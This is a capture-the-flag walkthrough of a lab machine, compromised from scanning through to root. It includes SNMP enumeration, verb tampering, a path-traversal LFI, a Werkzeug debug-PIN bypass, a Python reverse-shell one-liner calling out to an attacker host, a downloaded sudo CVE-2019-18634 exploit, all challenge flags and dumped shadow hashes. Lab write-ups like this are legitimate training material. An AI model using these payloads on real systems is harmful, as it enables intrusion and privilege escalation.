
=====================================Plain Sight====================================
// scan with nmap -sC -sV -Pn 10.13.37.11
// 22, 80, 5000 are opened
browse to http://10.13.37.11/ 
// Read the source code
Flag 1 is AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}

=================================Take a look around=================================
sudo nmap -sU 10.13.37.11
Enumerate snmp

sudo msfconsole
use auxiliary(scanner/snmp/snmp_enum)
> set RHOSTS 10.13.37.11
> run

OR

snmp-check -c public -v 2c 10.13.37.11 -d

OR

perl /usr/share/doc/libnet-snmp-perl/examples/snmpwalk.pl -v 1 -c public 10.13.37.11

// Read the output
Flag 2 is AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}

=================================Dead Poets=========================================
// i got these files: 
/dev/space_dev.py
/var/www/html/scripts/backup_every_17minutes.sh
// it says backups every 17 minutes 

// Trying to read /scripts/backup_every_17minutes.sh
curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh

Flag 3 is AKERVA{IKNoW###VeRbTamper!nG_==}
//  Verb Tampering like one challenge on root-me.org

=================================Now You See Me====================================
// Previous script is saved in backup_every_17minutes.sh on my local machine
// What does the script ?

1- backing up the content of the website to a zip file
2- The zip file is saved as backup_$timestamp //process repeated every 17 min
3- the zip file name is changing in every 1020 secs (17 min)
4- backup file is available on the website in backups/

// i don't know the current time of machine
// i remenber that i read time when i performed snmp enum
// SO trying to get time using a simple http request

curl -I http://10.13.37.11
// Date: Mon, 20 Jul 2020 19:51:44 GMT
// So file name should be smething like backup_20200720200000.zip

// using wfuzz to get the exact file name
wfuzz -u http://10.13.37.11/backups/backup_2020072020FUZZ.zip -w wordlist.txt --hc 404

// crunch 4 4 0123456789 -o wordlist.txt to generate wordlist

// Now Download the file
wget http://10.13.37.11/backups/backup_2020072020{4525}.zip
// without {}
password and aas creds are in space_dev.py
// i cloned it locally

Flag 4 is AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
===================================Open Book========================================
Login using creds

Just Hello World Message
// Holy shit
// trying to fuzz it

python3 dirsearch.py -u http://10.13.37.11:5000/ -e php

OR

wfuzz -u http://10.13.37.11:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404

They reveal three folders:
200 - /console
401 - /download
401 - /file

// /console reveals that there is a shell running under server
// after reading space_dev.py, i found this @app.route("/file")
// /file as a parameter filename which can open a file
// trying to exploit this LFI
http://10.13.37.11:5000/file?filename=../../../../../etc/passwd
http://10.13.37.11:5000/file?filename=../../../../../home/aas/flag.txt
Flag 5 is AKERVA{IKNOW#LFi_@_}

==================================Say Friend and Enter==============================
// TCP port scanning reveals that port 5000 = Werkzeug httpd 0.16.0 (Python 2.7.15+)
// Since /console ask a pin, i just search werkzeug console pin
// i found these links
https://werkzeug.palletsprojects.com/en/1.0.x/debug/
https://www.daehee.com/werkzeug-console-pin-exploit/

// The first one just show me that the pin is enabled by werkzeug , its a dependency that is being used to protect the running console with a pin
// the second give me a script to get pin (saved to exploit.py)

// I have to change username by aas and private_bits also
// Use LFI to get /sys/class/net/ens33/address and /etc/machine-id
// Replace it in the corresponding field
258f132cd7e647caaf5510e3aca997c1
00:50:56:b9:3c:f8
// The first one gives me a MAC address but i have to convert it
python
>>> print(0x5056b93cf8)
345052364024
// save and run the exploit
python exploit.py

// key is 151-392-393
// Now i'm in console
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

nc -lnvp 1234

// Get connection back to my listener
// This to get a better shell
python -c 'import pty;pty.spawn("/bin/bash")'

aas@Leakage:~$ whoami
whoami
aas
aas@Leakage:~$ hostname
Leakage

ls -la
cat .hiddenflag.txt
Flag 6 is AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}

=================================Super Mushroom=====================================
aas@Leakage:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

When browsing, i found this https://github.com/saleemrashid/sudo-cve-2019-18634/
// compile the c file and send it to machine
gcc -o sudo sudo.c

// on my machine: sudo python3 -m http.server 80

// on victim's: wget http://IP/sudo
run the file and get root shell
python -c "import pty;pty.spawn('/bin/bash')"
cd /root
cat root.txt
Flag 7 is AKERVA{IkNow_Sud0_sUckS!}

================================Little secret=======================================
cat secured_note.md
R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
U1BNSUhITU9EQVVLSEUK

@AKERVA_FR | @lydericlefebvre

// decode from base64 with cyberchef give:
GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE

// Page on port 80 gives me hint
// Use vegenere cipher from https://www.dcode.fr/vigenere-cipher to decode it
// Nothing comprehensive
// Maybe some letters missing
// Check that with missing.py
B J Q X Z   are missing
// suppress them in dcode alphabet field
// so final alphabet is ACDEFGHIKLMNOPRSTUVWY
// The key is ILOVESPACE
WELLDONEFORSOLVINGTHISCHALLENGEYOUCANSENDYOURRESUMEHEREATRECRUTEMENTAKERVACOMANDVALIDATETHELASTFLAGWITHAKERVAIKNOOOWVIGEEENERRRE

WELL DONE FOR SOLVING THIS CHALLENGE YOU CAN SEND YOUR RESUME HERE AT RECRUTEMENT AKERVA COMAND VALIDATE THE LAST FLAG WITH AKERVAIKNOOOWVIGEEENERRRE

Flag 8 is AKERVA{IKNOOOWVIGEEENERRRE}

=====================================================================================
root:$6$JunTLSen$1U9hBqUlth4MwzOuFVSaDfEfFGxQgzRPfkbwHLXGp7Z84fGPkAsMcjFBDb43YS8h9wUNWdZ5TTJkSP4jKKI9g0:18301:0:99999:7:::
aas:$6$aka9Jj5r$3F/QEQa2GG9wFRqmTlCw1dgAzGiChPbcyEORD0djRCEbFJctBzWuc0kKxUES5UBwqHubiwNAsUw9oCMs7M7K20:18301:0:99999:7:::
